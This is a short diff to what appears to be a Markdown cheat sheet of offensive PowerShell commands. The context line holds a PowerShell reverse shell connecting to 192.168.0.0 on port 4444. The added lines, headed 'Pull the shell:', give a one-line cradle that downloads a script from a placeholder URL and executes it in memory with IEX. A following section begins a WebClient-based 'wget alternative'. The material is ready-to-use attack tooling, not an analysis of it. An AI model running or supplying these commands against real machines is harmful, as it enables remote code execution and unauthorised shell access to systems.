@@ -8,6 +8,11 @@ $sm=(New-Object Net.Sockets.TCPClient('192.168.0.0',4444)).GetStream();[byte[]]$
 
 ```
 
+Pull the shell:
+```
+powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('SHELL URL')"
+```
+
 ### Wget Alternative for Windows in PowerShell
 ```
 $client = new-object System.Net.WebClient
